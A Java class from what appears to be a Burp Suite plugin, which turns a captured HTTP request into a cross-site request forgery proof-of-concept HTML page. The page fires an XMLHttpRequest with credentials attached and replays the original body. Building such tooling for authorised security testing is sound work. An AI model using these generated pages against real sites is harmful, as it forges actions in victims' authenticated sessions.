
package burp.pocs;

import java.util.List;

import burp.IRequestInfo;
import burp.util.Header;
import burp.util.Parameter;
import burp.util.Request;
import burp.util.Util;

/**
 * Ajax CSRF POCs
 * 
 * @author Joaquin R. Martinez <joaquin.ramirez.mtz.lab@gmail.com>
 */
public class AjaxPoc implements PocGenerator {

	@Override
	public byte[] generate(final Request request) {
		String lineSeparator = System.lineSeparator();
		String scriptTag = createScriptTag(request, lineSeparator);
		String formTag = createFormTag(lineSeparator);
		return createHTMLPage(scriptTag + formTag, lineSeparator).getBytes();
	}

	private String createFormTag(String lineSeparator) {
		String form = "    <form action=\"#\">" + lineSeparator;
		form += "      <input type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\" />" + lineSeparator;
		form += "    </form>" + lineSeparator;
		return form;
	}

	private String createScriptTag(final Request request, String lineSeparator) {
		String script = "    <script>" + lineSeparator;
		script += "      function submitRequest() {" + lineSeparator;
		script += "        var xhr = new XMLHttpRequest();" + lineSeparator;
		if ("GET".equals(request.getMethod())) {
			script += createGETXHRRequest(request.getUrl().toString(), lineSeparator);
		} else {
			script += createNotGETXHRRequest(request, lineSeparator);
		}
		script += "      }" + lineSeparator;
		script += "    </script>" + lineSeparator;
		return script;
	}

	private String createGETXHRRequest(String url, String lineSeparator) {
		String getRequest = String.format("        xhr.open(\"GET\", \"%s\", true);%s", url, lineSeparator);
		getRequest += "        xhr.send();" + lineSeparator;
		return getRequest;
	}

	private String createNotGETXHRRequest(final Request request, String lineSeparator) {
		String postRequest = "";
		postRequest += String.format("        xhr.open(\"%s\", \"%s\", true);%s", request.getMethod(),
				request.getUrl().toString(), lineSeparator);
		postRequest += addHeaders(request.getHeaders(), lineSeparator);
		postRequest += "        xhr.withCredentials = true;" + lineSeparator;
		postRequest += "        var body = " + createBody(request, lineSeparator) + lineSeparator;
		postRequest += "        var aBody = new Uint8Array(body.length);" + lineSeparator;
		postRequest += "        for (var i = 0; i < aBody.length; i++)" + lineSeparator;
		postRequest += "          aBody[i] = body.charCodeAt(i);" + lineSeparator;
		postRequest += "        xhr.send(new Blob([aBody]));" + lineSeparator;
		return postRequest;
	}

	private String addHeaders(final List<Header> headers, String lineSeparator) {
		String accept = "*/*";
		String content = "text/plain";
		for (Parameter next : headers) {
			if ("Accept".equalsIgnoreCase(next.getName()))
				accept = next.getValue();
			if ("Content-Type".equalsIgnoreCase(next.getName()))
				content = next.getValue();
		}

		String pocString = String.format("        xhr.setRequestHeader(\"Accept\", \"%s\");", accept) + lineSeparator;
		pocString += String.format("        xhr.setRequestHeader(\"Content-Type\", \"%s\");", content) + lineSeparator;
		return pocString;
	}

	private String createHTMLPage(String body, String lineSeparator) {
		String html = "<!DOCTYPE html>" + lineSeparator;
		html += "<html>" + lineSeparator;
		html += "  <!-- CSRF PoC - generated by Burp Suite plugin -->" + lineSeparator;
		html += "<body>" + lineSeparator;
		html += body;
		html += "</body>" + lineSeparator;
		html += "</html>";
		return html;
	}

	private String createBody(final Request request, final String lineSeparator) {
		String body = Util.escape(request.getRequestBody());
		String formattedBody = String.format("\"%s\";%s", body, lineSeparator);
		if (request.getContentType() == IRequestInfo.CONTENT_TYPE_MULTIPART) {
			formattedBody = createMultipartBody(body, lineSeparator);
		}
		return formattedBody;
	}

	private String createMultipartBody(final String body, final String lineSeparator) {
		String formattedLines = "";
		String[] lines = body.split("\r\n");
		for (int i = 0; i < lines.length; i++) {
			String endLine = (i == lines.length - 1) ? ";" : " +";
			formattedLines += String.format("\"%s\\r\\n\"%s%s", lines[i], endLine, lineSeparator);
		}
		return formattedLines;
	}

}
